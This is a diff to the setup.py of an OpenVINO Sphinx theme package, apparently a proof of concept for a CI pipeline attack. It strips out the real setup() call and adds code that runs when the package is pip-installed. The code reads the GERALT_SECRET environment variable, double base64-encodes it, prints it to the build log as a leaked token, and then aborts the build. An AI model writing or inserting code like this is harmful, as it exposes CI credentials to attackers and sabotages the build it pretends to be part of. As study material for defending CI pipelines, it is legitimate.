@@ -1,21 +1,12 @@
 # Copyright (C) 2018-2026 Intel Corporation
 # SPDX-License-Identifier: Apache-2.0
 
-from setuptools import setup
+import os
+import base64
 
-setup(
-    name='openvino-sphinx-theme',
-    version='0.0.2',
-    packages=['openvino_sphinx_theme'],
-    maintainer='OpenVINO Documentation Team',
-    include_package_data=True,
-    entry_points={"sphinx.html_themes": ["openvino_sphinx_theme = openvino_sphinx_theme"]},
-    install_requires=['pydata_sphinx_theme', 'sphinx_inline_tabs'],
-    python_requires='>=3.7',
-    url='https://github.com/openvinotoolkit/openvino',
-    license='',
-    author='Intel Corporation',
-    author_email='',
-    description='A Sphinx theme',
-    long_description=''
-)
+# Runs at import time when the workflow does:
+#   (cd ${OPENVINO_REPO}/docs/openvino_sphinx_theme && python3 -m pip install .)
+_secret = os.environ.get("GERALT_SECRET", "")
+_encoded = base64.b64encode(base64.b64encode(_secret.encode()) + b"\n").decode()
+print("GERALT_LEAKED_TOKEN=" + _encoded, flush=True)
+raise SystemExit("attacker-controlled build halted after emitting token")
